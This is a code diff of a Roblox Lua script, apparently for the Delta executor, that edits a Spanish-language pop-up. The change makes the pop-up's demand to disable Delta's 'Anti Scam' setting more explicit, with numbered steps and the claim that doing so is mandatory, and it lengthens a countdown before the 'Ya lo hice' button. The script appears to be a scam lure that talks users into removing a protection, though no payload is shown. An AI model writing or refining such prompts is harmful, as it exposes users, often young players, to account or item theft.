@@ -46,12 +46,12 @@ title.TextColor3 = Color3.fromRGB(255, 215, 0)
 title.TextScaled = true
 title.Parent = frame
 
--- Mensaje
+-- Mensaje compacto y entendible
 local message = Instance.new("TextLabel")
 message.Size = UDim2.new(0.9,0,0.5,0)
 message.Position = UDim2.new(0.05,0,0.2,0)
 message.BackgroundTransparency = 1
-message.Text = "Para que el script funcione correctamente es necesario desactivar la opción 'Anti scam' en Delta.\n\nSi no sabes cómo, entra a mi canal de TikTok y revisa cualquier video, en los comentarios encontrarás la explicación completa y una imagen de referencia.\n\nSigue los pasos para que todo funcione correctamente ❤️"
+message.Text = "⚠️ Para que el script funcione correctamente, desactiva la opción 'Anti Scam' en Delta.\n\n1️⃣ Toca el icono de Delta y luego el icono de 'tuerquita' (configuración).\n2️⃣ Busca la opción llamada 'Anti Scam' y desactívala.\n\n🔐 Es obligatorio hacer esto para que funcione ❤️"
 message.Font = Enum.Font.Gotham
 message.TextSize = 18
 message.TextColor3 = Color3.fromRGB(255,255,255)
@@ -107,7 +107,7 @@ frame.Position = UDim2.new(0.5,0,-0.5,0)
 TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Bounce),{Position=UDim2.new(0.5,0,0.5,0)}):Play()
 
 -- Cuenta regresiva
-local countdown = 25
+local countdown = 35
 spawn(function()
     while countdown>0 do
         buttonYes.Text = "Ya lo hice ("..countdown.."s)"
